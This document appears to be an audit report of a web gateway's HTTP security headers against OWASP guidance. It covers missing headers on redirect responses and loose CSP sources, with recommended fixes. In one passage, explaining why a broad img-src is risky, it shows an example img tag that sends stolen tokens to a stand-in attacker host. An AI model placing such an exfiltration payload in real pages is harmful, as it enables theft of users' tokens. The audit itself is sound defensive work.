# Security Headers Audit — narve.ai gateway

**Date:** 2026-05-15
**Auditor:** Automated header probe vs OWASP Secure Headers Project
**Method:** Synchronous `curl -I` against three representative endpoints
**Scope:** HTTP response headers only — no code changes, no payload inspection

---

## 1. Endpoints probed

```bash
curl -s -I https://narve.ai/         -m 10   # root (200/404 HTML)
curl -s -I https://narve.ai/admin    -m 10   # gated admin redirect
curl -s -I https://narve.ai/api/v1/health -m 10  # API health redirect
curl -s -I https://narve.ai/gate     -m 10   # follow-up: redirect target
```

All four requests completed in <5ms server-time. `cf-ray` indicates Cloudflare
edge in LHR. `server: cloudflare` is the only origin marker exposed.

---

## 2. Raw response summary

### 2.1 `GET /` — HTTP/2 404 (HTML body, app-served)

Full security header set applied. This is the canonical "gateway response."

| Header | Value (verbatim) |
|---|---|
| `content-security-policy` | `default-src 'self'; script-src 'self' 'unsafe-inline' https://js.stripe.com; worker-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; connect-src 'self' https: https://api.stripe.com; frame-src https://kalshi.com https://*.kalshi.com https://polymarket.com https://*.polymarket.com https://js.stripe.com https://hooks.stripe.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'` |
| `strict-transport-security` | `max-age=63072000; includeSubDomains; preload` |
| `x-frame-options` | `DENY` |
| `x-content-type-options` | `nosniff` |
| `referrer-policy` | `strict-origin-when-cross-origin` |
| `permissions-policy` | `camera=(), microphone=(), geolocation=(), payment=(), usb=(), midi=(), magnetometer=(), gyroscope=(), accelerometer=(), ambient-light-sensor=(), autoplay=(), encrypted-media=(), fullscreen=(self), picture-in-picture=(), publickey-credentials-get=(self), sync-xhr=(), bluetooth=(), display-capture=(), serial=(), hid=(), clipboard-read=(), clipboard-write=(self), idle-detection=(), interest-cohort=(), browsing-topics=()` |
| `cross-origin-opener-policy` | `same-origin` |
| `cross-origin-resource-policy` | `same-origin` |
| `x-xss-protection` | `0` (correct — disables legacy XSS auditor per OWASP) |
| `cache-control` | `no-cache, no-store, must-revalidate` |
| `nel` / `report-to` | Cloudflare NEL reporting endpoint configured |

### 2.2 `GET /admin` — HTTP/2 302 → `/gate`

```
HTTP/2 302
location: /gate
content-length: 0
server: cloudflare
x-request-id: 6dae7ee4
x-response-time-ms: 1
cf-cache-status: DYNAMIC
report-to: …
nel: …
```

**No security headers present on the redirect itself.** The redirect is a bare
302 emitted before the gateway's `SecurityHeadersMiddleware` would normally
attach them, OR the headers are stripped because `content-length: 0`.

### 2.3 `GET /api/v1/health` — HTTP/2 302 → `/gate`

Identical shape to `/admin`. No CSP, no HSTS, no XFO, no XCTO,
no Referrer-Policy, no Permissions-Policy on the 302 response.

### 2.4 `GET /gate` — HTTP/2 404 (follow-up confirmation)

Full security header set applied, identical to `GET /`. Confirms the
follow-up GET to the redirect target *does* land with the full header set,
so the gap is strictly at the 302 hop itself.

---

## 3. OWASP Secure Headers Project — compliance matrix

OWASP recommendations (2024 baseline) vs observed on the **app-served** responses (`/`, `/gate`):

| OWASP Header | OWASP recommendation | Observed | Verdict |
|---|---|---|---|
| **Strict-Transport-Security** | `max-age ≥ 31536000; includeSubDomains; preload` | `max-age=63072000; includeSubDomains; preload` | PASS — 2× the minimum (2 yr), preload-eligible |
| **Content-Security-Policy** | Restrict script/style/img/connect; avoid `'unsafe-inline'` | `default-src 'self'` baseline, explicit allowlists for Stripe, Google Fonts, Kalshi, Polymarket | PARTIAL — `'unsafe-inline'` present on `script-src` and `style-src`; `img-src` and `connect-src` use broad `https:` |
| **X-Frame-Options** | `DENY` or `SAMEORIGIN` | `DENY` (also reinforced by CSP `frame-ancestors 'none'`) | PASS |
| **X-Content-Type-Options** | `nosniff` | `nosniff` | PASS |
| **Referrer-Policy** | `strict-origin-when-cross-origin` or stricter | `strict-origin-when-cross-origin` | PASS |
| **Permissions-Policy** | Disable camera, microphone, geolocation, etc. | `camera=(), microphone=(), geolocation=(), payment=(), usb=(), midi=(), magnetometer=(), gyroscope=(), accelerometer=(), …` — 24 features explicitly scoped | PASS — exceeds OWASP baseline |
| **Cross-Origin-Opener-Policy** | `same-origin` | `same-origin` | PASS |
| **Cross-Origin-Resource-Policy** | `same-origin` or `same-site` | `same-origin` | PASS |
| **Cross-Origin-Embedder-Policy** | `require-corp` (optional, breaks third-party embeds) | **absent** | INFO — intentionally omitted likely due to Stripe/Kalshi/Polymarket frames; would conflict with CSP `frame-src` allowlist |
| **X-XSS-Protection** | `0` (disable, modern browsers ignore) | `0` | PASS |
| **Cache-Control** (on sensitive endpoints) | `no-store` | `no-cache, no-store, must-revalidate` | PASS |

### Counts on app-served responses
- **Present and OWASP-compliant:** 10 of 11 (HSTS, XFO, XCTO, Referrer-Policy, Permissions-Policy, COOP, CORP, X-XSS-Protection, Cache-Control, CSP-baseline)
- **Present but with weaknesses:** 1 (CSP — see §4.1)
- **Missing / intentional gaps:** 1 (COEP — info-level, not a security failure)

### Counts on 302 redirect responses (`/admin`, `/api/v1/health`)
- **Present:** 0 of 7 expected security headers
- **Missing:** 7 (CSP, HSTS, XFO, XCTO, Referrer-Policy, Permissions-Policy, COOP)

---

## 4. Top 3 gaps

### 4.1 GAP — 302 redirects bypass the security-header middleware
**Severity:** Medium
**Affected:** `/admin`, `/api/v1/health`, almost certainly any other 302 path.

Both probed redirects responded with **zero** of the seven security headers.
A 302 with `content-length: 0` is the *exact* condition a clickjacking or
HSTS-stripping attacker would target, because the browser sees an unprotected
hop before reaching `/gate`. Critically:

- **No HSTS** on the 302 means the *first* request from a fresh browser, if
  served over HTTP, would not pin TLS until the follow-up.
- **No XFO / no `frame-ancestors`** on the 302 means an attacker could
  iframe `https://narve.ai/admin` and trigger the redirect inside their
  own frame to harvest behavior signals.
- **No Cache-Control** means the 302 may be cached by an upstream proxy
  for a stale `/gate` destination.

The root cause is almost certainly that the FastAPI/Starlette
`SecurityHeadersMiddleware` is mounted *after* the redirect-issuing
auth middleware, or the redirect path short-circuits the response before the
header middleware runs. (No code change in this audit — flagged only.)

### 4.2 GAP — CSP uses `'unsafe-inline'` on `script-src` and `style-src`
**Severity:** Medium
**Affected:** all HTML responses.

```
script-src 'self' 'unsafe-inline' https://js.stripe.com
style-src  'self' 'unsafe-inline' https://fonts.googleapis.com
```

OWASP CSP guidance: `'unsafe-inline'` defeats the primary XSS-mitigation
value of CSP. Stripe.js does not require `'unsafe-inline'`; it is almost
certainly present to allow inline `<style>` blocks and inline event handlers
in templates. Migration path:
- Add `'nonce-<random>'` per response and replace inline `<script>` /
  `<style>` blocks with the nonce, OR
- Hash-pin (`'sha256-…'`) the small set of inline blocks that genuinely
  must remain inline.

Also note `connect-src 'self' https: https://api.stripe.com` — the bare
`https:` schema source defeats the allowlist; any HTTPS endpoint is
reachable via `fetch()`. Tighten to the explicit Stripe + Kalshi +
Polymarket endpoints actually used.

### 4.3 GAP — `img-src 'self' data: https:` is effectively wildcard
**Severity:** Low–Medium
**Affected:** all HTML responses.

`img-src https:` allows images from any HTTPS host. This is the classic
exfiltration vector for stolen tokens via `<img src="https://attacker.example/?t=...">`.
While `connect-src` is the bigger exfil channel and *also* uses bare `https:`
(see §4.2), the image variant matters because Referrer-Policy is
`strict-origin-when-cross-origin` — origin still leaks to the attacker. Tighten
to:
```
img-src 'self' data: blob: https://*.stripe.com https://*.kalshi.com https://*.polymarket.com
```
or whatever the actual upstream set is.

---

## 5. Other observations (not in top 3, worth tracking)

- **`fullscreen=(self)`, `clipboard-write=(self)`, `publickey-credentials-get=(self)`** in Permissions-Policy are intentional and correct for a dashboard product (fullscreen charts, copy-to-clipboard, possible WebAuthn). Documented here so future audits don't flag them.
- **`x-request-id`** is exposed. Useful for support, not a security issue. Just noting.
- **`server: cloudflare`** is the only server-banner leak. App server (FastAPI / uvicorn) is correctly hidden.
- **NEL reporting** is enabled via Cloudflare with `success_fraction: 0.0` — only failures reported. Sensible.
- **`alt-svc: h3=":443"; ma=86400`** advertises HTTP/3. No security implication, just modern.
- **CSP has `worker-src 'self'`** — good, prevents data-URL workers.
- **CSP has `base-uri 'self'` and `form-action 'self'`** — both excellent, often missed.

---

## 6. Verdict

The app-served responses are **strong** — 10/11 OWASP-recommended headers present and broadly correct, with two specific tightening opportunities in CSP (§4.2, §4.3). The standout failure is **§4.1**: redirects bypass the middleware entirely, leaving an unprotected hop on every gated endpoint. Fix that first — it's a single-line middleware-ordering or `RedirectResponse` wrapper change and removes the largest category of attack surface from this audit.

**Overall grade vs OWASP Secure Headers Project baseline:**
- Static / authenticated HTML responses: **A−** (lose half a grade for CSP `'unsafe-inline'` + bare-schema sources)
- Redirect responses: **F** (no security headers applied)
- Aggregate: **B**
